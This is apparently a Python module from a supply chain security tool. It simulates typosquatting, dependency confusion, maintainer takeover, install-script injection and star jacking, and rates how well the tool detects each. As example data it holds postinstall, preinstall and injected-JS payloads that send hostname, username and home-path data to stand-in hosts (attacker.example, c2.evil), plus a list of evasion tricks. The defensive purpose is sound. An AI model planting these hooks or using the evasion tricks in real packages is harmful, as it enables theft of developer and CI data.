"""Supply chain attack simulation framework.

Each simulation generates a realistic model of how an attacker would execute a
specific attack vector, along with depfence's detection coverage for that vector.
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any


class RiskLevel(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"


@dataclass
class SimulationResult:
    """Result of a single simulated attack."""

    attack_type: str
    description: str
    risk_level: RiskLevel
    detection_methods: list[str]
    mitigations: list[str]
    would_be_detected: bool
    detection_coverage: float  # 0.0–1.0
    attacker_artifacts: dict[str, Any] = field(default_factory=dict)
    """Concrete artifacts the simulation generated (names, payloads, etc.)."""

    def summary(self) -> str:
        status = "DETECTED" if self.would_be_detected else "BYPASSED"
        pct = int(self.detection_coverage * 100)
        return f"[{self.risk_level.value.upper()}] {self.attack_type}: {status} ({pct}% coverage)"


# ---------------------------------------------------------------------------
# Typosquat helpers
# ---------------------------------------------------------------------------

def _generate_typosquat_candidates(name: str) -> list[str]:
    """Produce plausible typosquat variants of *name*."""
    candidates: list[str] = []

    # 1. Adjacent-key substitutions (common keyboard adjacency)
    adjacency: dict[str, list[str]] = {
        "a": ["s", "q", "z"],
        "b": ["v", "g", "n"],
        "c": ["x", "d", "v"],
        "d": ["s", "e", "f", "c"],
        "e": ["w", "r", "d"],
        "f": ["d", "g", "r"],
        "g": ["f", "h", "t", "b"],
        "h": ["g", "j", "y", "n"],
        "i": ["u", "o", "k"],
        "j": ["h", "k", "u"],
        "k": ["j", "l", "i"],
        "l": ["k", "o", "p"],
        "m": ["n", "j", "k"],
        "n": ["b", "m", "h"],
        "o": ["i", "p", "l"],
        "p": ["o", "l"],
        "q": ["w", "a"],
        "r": ["e", "t", "f"],
        "s": ["a", "d", "w"],
        "t": ["r", "y", "g"],
        "u": ["y", "i", "j"],
        "v": ["c", "b", "f"],
        "w": ["q", "e", "s"],
        "x": ["z", "c", "s"],
        "y": ["t", "u", "h"],
        "z": ["a", "x", "s"],
    }
    for i, ch in enumerate(name):
        for alt in adjacency.get(ch.lower(), []):
            variant = name[:i] + alt + name[i + 1:]
            if variant != name:
                candidates.append(variant)

    # 2. Character omission
    for i in range(len(name)):
        if name[i] not in ("-", "_"):
            candidates.append(name[:i] + name[i + 1:])

    # 3. Character duplication
    for i, ch in enumerate(name):
        candidates.append(name[:i] + ch + name[i:])

    # 4. Hyphen/underscore swap
    if "-" in name:
        candidates.append(name.replace("-", "_"))
    if "_" in name:
        candidates.append(name.replace("_", "-"))

    # 5. Homoglyph substitutions
    homoglyphs = {"o": "0", "l": "1", "i": "l", "e": "3", "a": "@"}
    for ch, sub in homoglyphs.items():
        if ch in name:
            candidates.append(name.replace(ch, sub, 1))

    # 6. Common suffix additions
    for suffix in ["-js", "-py", "-lib", "-sdk", "-client", "-util", "-helper"]:
        candidates.append(name + suffix)

    # Deduplicate, remove exact match and empty strings
    seen: set[str] = set()
    unique: list[str] = []
    for c in candidates:
        if c and c != name and c not in seen:
            seen.add(c)
            unique.append(c)

    return unique[:20]  # cap at 20


# ---------------------------------------------------------------------------
# AttackSimulator
# ---------------------------------------------------------------------------

class AttackSimulator:
    """Simulate supply chain attacks against a package or project.

    Each method returns a SimulationResult describing the attack vector,
    whether depfence detects it, and the detection coverage score.
    """

    # -----------------------------------------------------------------------
    # 1. Typosquatting
    # -----------------------------------------------------------------------

    def simulate_typosquat(
        self, target_package: str, ecosystem: str = "npm"
    ) -> SimulationResult:
        """Generate plausible typosquat names and assess detection coverage.

        Args:
            target_package: The legitimate package name being squatted.
            ecosystem: Target ecosystem (npm, pypi, cargo, go).

        Returns:
            SimulationResult with generated names and coverage assessment.
        """
        candidates = _generate_typosquat_candidates(target_package)

        # Detection relies on edit-distance checks and slopsquat scanner
        # depfence has typosquat + slopsquat scanners
        detection_methods = [
            "Edit-distance check against known-popular packages (Levenshtein ≤ 2)",
            "Slopsquat scanner catches AI-hallucinated names",
            "Reputation scanner flags newly registered low-download packages",
            "Name pattern analysis catches homoglyph substitutions",
        ]
        mitigations = [
            f"Pin exact versions in lockfile for {target_package}",
            "Enable depfence slopsquat scanner in CI",
            "Use scoped packages (@org/package) to reduce squatting surface",
            "Configure allowed-packages allowlist for critical dependencies",
            "Monitor registry for new packages with names similar to yours",
        ]

        # depfence's typosquat + slopsquat scanners cover ~75% of variants
        coverage = 0.75
        detected = True

        return SimulationResult(
            attack_type="typosquatting",
            description=(
                f"Attacker registers one or more near-identical names to '{target_package}' "
                f"on {ecosystem}. Developers install the malicious package by mistyping "
                f"or via an AI coding tool that hallucinates the name."
            ),
            risk_level=RiskLevel.HIGH,
            detection_methods=detection_methods,
            mitigations=mitigations,
            would_be_detected=detected,
            detection_coverage=coverage,
            attacker_artifacts={
                "target": target_package,
                "ecosystem": ecosystem,
                "squatted_candidates": candidates[:10],
                "highest_risk_candidates": candidates[:3],
            },
        )

    # -----------------------------------------------------------------------
    # 2. Dependency confusion
    # -----------------------------------------------------------------------

    def simulate_dep_confusion(
        self, org_prefix: str, registry: str = "https://registry.npmjs.org"
    ) -> SimulationResult:
        """Model a dependency confusion attack against an internal package prefix.

        Args:
            org_prefix: The organisation's internal package prefix (e.g. "acme").
            registry: Public registry URL the attacker would publish to.

        Returns:
            SimulationResult describing the confusion scenario.
        """
        internal_names = [
            f"{org_prefix}-auth",
            f"{org_prefix}-api",
            f"{org_prefix}-utils",
            f"{org_prefix}-sdk",
            f"{org_prefix}-internal",
        ]
        attack_version = "9999.0.0"

        payload_package_json = {
            "name": f"{org_prefix}-auth",
            "version": attack_version,
            "description": "placeholder",
            "scripts": {
                "postinstall": (
                    "node -e \""
                    "const c=require('child_process'),h=require('os').hostname(),"
                    "u=require('os').userInfo().username;"
                    "c.execSync('curl -s https://attacker.example/c2?h='+h+'&u='+u);"
                    "\""
                ),
            },
        }

        detection_methods = [
            "Version anomaly scanner: 9999.x.x squatter pattern is CRITICAL signal",
            "Dep confusion scanner checks internal naming patterns (corp, infra, api prefixes)",
            "Install script scanner detects postinstall with curl/network calls",
            "Registry cross-check: package absent from private registry is flagged",
            "Behavioral scanner: network exfiltration pattern in postinstall",
        ]
        mitigations = [
            f"Add '{org_prefix}' to dep_confusion.internal_prefixes in depfence.yml",
            "Pin all internal packages to private registry in .npmrc scope rules",
            "Use --index-url (exclusive) for PyPI, never --extra-index-url",
            "Set always-auth=true in .npmrc to prevent public registry fallback",
            "Block 999.x.x / 9999.x.x version patterns in CI policy",
        ]

        return SimulationResult(
            attack_type="dependency_confusion",
            description=(
                f"Attacker publishes '{org_prefix}-auth@{attack_version}' (and similar) to "
                f"{registry}. Build tools that query both private and public registries "
                f"resolve the higher version from the public registry, executing the "
                f"attacker's postinstall payload on developer machines and CI."
            ),
            risk_level=RiskLevel.CRITICAL,
            detection_methods=detection_methods,
            mitigations=mitigations,
            would_be_detected=True,
            detection_coverage=0.90,
            attacker_artifacts={
                "org_prefix": org_prefix,
                "public_registry": registry,
                "targeted_packages": internal_names,
                "attack_version": attack_version,
                "example_payload": payload_package_json,
            },
        )

    # -----------------------------------------------------------------------
    # 3. Maintainer takeover
    # -----------------------------------------------------------------------

    def simulate_maintainer_takeover(self, package: str) -> SimulationResult:
        """Model an account compromise / maintainer takeover scenario.

        Args:
            package: Target package whose maintainer account would be compromised.

        Returns:
            SimulationResult describing the takeover attack chain.
        """
        attack_chain = [
            "1. Attacker identifies maintainer via npm/PyPI author metadata",
            "2. Credential stuffing or phishing compromises maintainer account",
            "3. Attacker publishes new patch version (e.g. 1.2.4) with malicious code",
            "4. Malicious code hides in minified bundle or uses eval/obfuscation",
            "5. Downstream projects auto-update via semver ranges (^1.2.3)",
            "6. Payload executes on install or at runtime to exfiltrate secrets",
        ]

        injected_payload = (
            ";(function(){try{const c=require('child_process');"
            "c.exec('curl -s https://c2.evil/'+Buffer.from(process.env.HOME).toString('base64'))"
            "}catch(e){}})();"
        )

        detection_methods = [
            "Ownership scanner: recent maintainer transfer on an established package",
            "Reputation scanner: contributor count drops to 1 after takeover",
            "Behavioral scanner: obfuscated eval/exec patterns in published code",
            "Provenance scanner: new version lacks SLSA attestation",
            "Freshness scanner: unexpected publish after long dormancy",
        ]
        mitigations = [
            f"Pin exact version of {package} in lockfile (no semver ranges)",
            "Enable depfence provenance scanner to require SLSA attestations",
            "Monitor package for unexpected new versions (freshness scanner)",
            "Use npm audit signatures / PyPI Trusted Publishers",
            "Require code review before updating any critical dependency",
            "Enable 2FA requirement for your own packages to prevent being a vector",
        ]

        # depfence detects ~65% — provenance + obfuscation help but not 100%
        coverage = 0.65
        detected = True

        return SimulationResult(
            attack_type="maintainer_takeover",
            description=(
                f"An attacker compromises the credentials of a '{package}' maintainer, "
                f"publishes a malicious patch version, and all projects using semver "
                f"ranges will silently auto-update on the next install."
            ),
            risk_level=RiskLevel.CRITICAL,
            detection_methods=detection_methods,
            mitigations=mitigations,
            would_be_detected=detected,
            detection_coverage=coverage,
            attacker_artifacts={
                "target_package": package,
                "attack_chain": attack_chain,
                "example_injected_payload": injected_payload,
                "affected_semver_ranges": [f"^x.y.z", f"~x.y.z", f">=x.y.z", f"*"],
            },
        )

    # -----------------------------------------------------------------------
    # 4. Build script injection
    # -----------------------------------------------------------------------

    def simulate_build_script_injection(
        self, package_json: str | dict | None = None
    ) -> SimulationResult:
        """Show what a malicious postinstall payload looks like and assess detection.

        Args:
            package_json: Path string, raw JSON string, or dict representing a
                package.json.  If None a synthetic example is used.

        Returns:
            SimulationResult with detected scripts and coverage assessment.
        """
        # Parse input
        pkg_data: dict = {}
        if isinstance(package_json, dict):
            pkg_data = package_json
        elif isinstance(package_json, str):
            p = Path(package_json)
            if p.exists():
                try:
                    pkg_data = json.loads(p.read_text())
                except Exception:
                    pkg_data = {}
            else:
                try:
                    pkg_data = json.loads(package_json)
                except Exception:
                    pkg_data = {}

        pkg_name = pkg_data.get("name", "<unknown>")
        existing_scripts = pkg_data.get("scripts", {})

        # Malicious payloads the attacker would inject
        malicious_payloads = {
            "postinstall": (
                "node -e \"const r=require,c=r('child_process'),o=r('os');"
                "c.exec('curl -s -d \\\"h='+o.hostname()+'&u='+o.userInfo().username"
                "+'&p='+process.cwd()+'\\\" https://c2.attacker.example/collect')\""
            ),
            "preinstall": (
                "python3 -c \"import os,urllib.request as u;"
                "u.urlopen('https://c2.attacker.example/ping?h='+os.uname().nodename)\""
                " 2>/dev/null || true"
            ),
        }

        # Check which hooks already exist (attacker would overwrite them)
        targeted_hooks = list(malicious_payloads.keys())
        existing_hooks = [h for h in targeted_hooks if h in existing_scripts]

        detection_methods = [
            "Preinstall scanner: flags any preinstall/postinstall/install lifecycle hooks",
            "Behavioral scanner: detects curl/wget/fetch in shell commands",
            "Network scanner: identifies outbound connection attempts during install",
            "Obfuscation scanner: detects Base64 encoding and string concatenation tricks",
            "Static analysis: flags eval(), exec() with computed strings",
        ]
        mitigations = [
            "Run `npm install --ignore-scripts` for packages that don't need lifecycle hooks",
            "Use `depfence preinstall-check` before installing new dependencies",
            "Enforce `ignore-scripts=true` in .npmrc for production builds",
            "Sandbox CI install steps (no network, no env vars leaked)",
            "Review all postinstall scripts before first install",
        ]

        return SimulationResult(
            attack_type="build_script_injection",
            description=(
                f"Attacker injects malicious lifecycle hooks (postinstall, preinstall) into "
                f"'{pkg_name}'. The hooks run automatically on `npm install` and exfiltrate "
                f"environment variables, tokens, and host metadata."
            ),
            risk_level=RiskLevel.HIGH,
            detection_methods=detection_methods,
            mitigations=mitigations,
            would_be_detected=True,
            detection_coverage=0.85,
            attacker_artifacts={
                "package_name": pkg_name,
                "targeted_hooks": targeted_hooks,
                "hooks_already_present": existing_hooks,
                "malicious_payloads": malicious_payloads,
                "evasion_techniques": [
                    "Split strings to avoid regex matching",
                    "Use process.argv[0] to locate node binary",
                    "Encode payload as Buffer.from(...).toString()",
                    "Wrap in try/catch to suppress errors silently",
                ],
            },
        )

    # -----------------------------------------------------------------------
    # 5. Star jacking
    # -----------------------------------------------------------------------

    def simulate_star_jacking(self, repo_url: str) -> SimulationResult:
        """Model GitHub star manipulation / star-jacking attacks.

        Star jacking inflates perceived popularity of a malicious package by
        pointing its repository URL at a legitimate high-star project, or by
        using bots to accumulate stars on a newly created malicious repo.

        Args:
            repo_url: The GitHub repository URL being modelled.

        Returns:
            SimulationResult describing the star-jacking scenario.
        """
        # Extract owner/repo if possible
        m = re.match(r"https?://github\.com/([^/]+)/([^/\s]+)", repo_url)
        owner = m.group(1) if m else "<owner>"
        repo_name = m.group(2) if m else "<repo>"

        attack_variants = [
            {
                "variant": "URL Hijack",
                "description": (
                    f"Malicious package sets 'repository' in package.json to "
                    f"'{repo_url}' (a popular legitimate project). "
                    f"Registry display shows inflated star count."
                ),
                "detection": "depfence cross-checks npm package name vs GitHub repo name",
            },
            {
                "variant": "Bot Network",
                "description": (
                    f"Attacker creates '{owner}/{repo_name}-evil' and uses a "
                    f"bot network to accumulate 1000+ stars within 48 hours, "
                    f"making it appear established."
                ),
                "detection": "Reputation scanner checks star velocity (stars/days since creation)",
            },
            {
                "variant": "Repo Redirect",
                "description": (
                    "Attacker forks a deleted high-star repo and publishes a "
                    "malicious package referencing the fork URL."
                ),
                "detection": "Provenance scanner checks repo creation date vs package age",
            },
        ]

        detection_methods = [
            "Reputation scorer: star count vs account age ratio anomaly detection",
            "Repository metadata cross-check: package name vs GitHub repo name mismatch",
            "Provenance scanner: new GitHub repo (< 30 days) with >1000 stars flagged",
            "Ownership scanner: identifies single-maintainer newly-created accounts",
            "Download velocity analysis: star count far exceeds actual download count",
        ]
        mitigations = [
            "Enable depfence reputation scanner — it cross-checks stars vs downloads",
            "Check GitHub repo creation date before trusting star count",
            "Verify package repository URL actually contains the published source",
            "Prefer packages with long history and multiple release authors",
            "Use SLSA provenance attestation to tie package to source repo cryptographically",
        ]

        # depfence has some reputation heuristics but not a live star-velocity API
        coverage = 0.45
        detected = False  # coverage < 0.5 means partial / not reliably detected

        return SimulationResult(
            attack_type="star_jacking",
            description=(
                f"Attacker manipulates GitHub star count for a repo associated with "
                f"'{owner}/{repo_name}' to artificially boost the package's perceived "
                f"legitimacy and trustworthiness in registry searches."
            ),
            risk_level=RiskLevel.MEDIUM,
            detection_methods=detection_methods,
            mitigations=mitigations,
            would_be_detected=detected,
            detection_coverage=coverage,
            attacker_artifacts={
                "target_repo": repo_url,
                "owner": owner,
                "repo": repo_name,
                "attack_variants": attack_variants,
                "social_engineering_factor": (
                    "High — developers routinely use star count as proxy for quality"
                ),
            },
        )
